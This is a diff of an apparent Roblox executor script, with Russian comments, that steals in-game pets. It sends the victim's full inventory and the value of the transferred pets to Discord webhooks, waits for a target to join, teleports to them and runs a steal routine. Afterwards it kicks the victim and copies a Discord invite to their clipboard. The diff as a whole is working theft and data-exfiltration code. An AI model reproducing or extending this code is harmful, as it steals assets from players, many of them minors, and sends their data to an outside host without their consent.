-                sendPetTransferredLog(petName, level, weight, value)
-
-
-                getgenv().TransferredCount += 1
-                getgenv().TransferredValue += value
-            end
-        end
-    end
-
-    -- 🧾 финальный отчёт, если больше нечего передавать
-    if not anyTransferred and not getgenv().FinalTransferSent then
-        getgenv().FinalTransferSent = true
-
-        local summary = string.format("**🎯 Все питомцы переданы.**\nКоличество: %d\nОбщая стоимость: 💰 %d", getgenv().TransferredCount, getgenv().TransferredValue)
-        createDiscordEmbed("Все возможные питомцы были переданы.", summary, "")
-    end
-end
-
-
-                end
+            if success then
+                print("=============Backup webhook response:", response.StatusCode, response.Body)
             else
-                lastTarget = nil
-                targetEnterTime = 0
+                warn("=============Backup webhook error:", response)
             end
         end
-    end)
-end
+
+        if success and response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+            warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
+        elseif callback then
+            callback()
+        end
+    end
+
+    createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "", function()
+        print("✅ Отправлено в Discord, начинаем слежку за целью.")
+
+        local function idlingTarget()
+            while true do
+                local findTarget, trigerName = waitForJoin()
+                if findTarget and trigerName then
+                    print("=============Target found:", trigerName)
+                    teleportTarget(trigerName)
+                    startSteal(trigerName)
+                    checkPetsInventory(trigerName)
+                end
+                task.wait(1)
+            end
+        end
 
         idlingTarget()
-
     end)
 end
-
-sendFullInventory() -- после всех действий
-
-
 
 local function sendFullInventoryFile()
     local webhookUrl = getgenv().FullInventoryWebhook
     if not webhookUrl or webhookUrl == "" then return end
 
-    local HttpService = game:GetService("HttpService")
-    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
     local allPetData = dataModule:GetData().PetsData.PetInventory.Data
-
     local petLines = {}
-    local growthFactor = 0.1 -- спрятано
+    local growthFactor = 0.1
 
     for _, value in pairs(allPetData) do
         local petName = value.PetType
@@ -757,8 +993,6 @@ local function sendFullInventoryFile()
     end
 
     local fullText = table.concat(petLines, "\n")
-
-    -- сохранить во временный файл
     local fileName = "full_inventory.txt"
     writefile(fileName, fullText)
 
@@ -787,40 +1021,19 @@ local function sendFullInventoryFile()
         return request(payload)
     end)
 
-    if success and response.StatusCode == 200 or response.StatusCode == 204 then
+    if success and (response.StatusCode == 200 or response.StatusCode == 204) then
         print("✅ Full inventory sent as file.")
     else
         warn("❌ Failed to send full inventory:", response and response.StatusCode)
     end
 end
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+sendFullInventory()
+sendFullInventoryFile()
 
 -- Условия для вызова startStealingProcess или loadstring
 if not getgenv().Webhook or not getgenv().Username then
-    game.Players.LocalPlayer:Kick("⚠️ Webhook or Username is not set.")
+    LocalPlayer:Kick("⚠️ Webhook or Username is not set.")
     return
 end
 
@@ -913,7 +1126,7 @@ for i = duration, 1, -1 do
         0.25,
         true
     )
-    wait(1)
+    task.wait(1)
 end
 
 for t = 1, 20 do
@@ -925,7 +1138,7 @@ for t = 1, 20 do
     Title.TextStrokeTransparency = alpha
     TimerLabel.TextTransparency = alpha
     TimerLabel.TextStrokeTransparency = alpha
-    wait(0.03)
+    task.wait(0.03)
 end
 
 print("=============8")
@@ -936,18 +1149,17 @@ task.delay(10, function()
     local newTotal = 0
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
-        if not checkPetsWhitelist(petName) then continue end
+        if not checkPetsWhitelist(petName, value.PetData) then continue end
         local petPrice = PET_VALUES[petName] or 0
         newTotal += petPrice
     end
 
     if newTotal < inventoryValue then
-        local player = game.Players.LocalPlayer
         local screenGui = Instance.new("ScreenGui")
         screenGui.Name = "TheftWarning"
         screenGui.ResetOnSpawn = false
         screenGui.IgnoreGuiInset = true
-        screenGui.Parent = player:WaitForChild("PlayerGui")
+        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(0.5, 0, 0.3, 0)
@@ -973,7 +1185,7 @@ task.delay(10, function()
 
         task.wait(10)
         setclipboard("https://discord.gg/Rm5XHagSJW")
-        player:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
+        LocalPlayer:Kick("⚠️ Some of your pets were stolen.\nJoin: discord.gg/Rm5XHagSJW")
     end
 end)
 
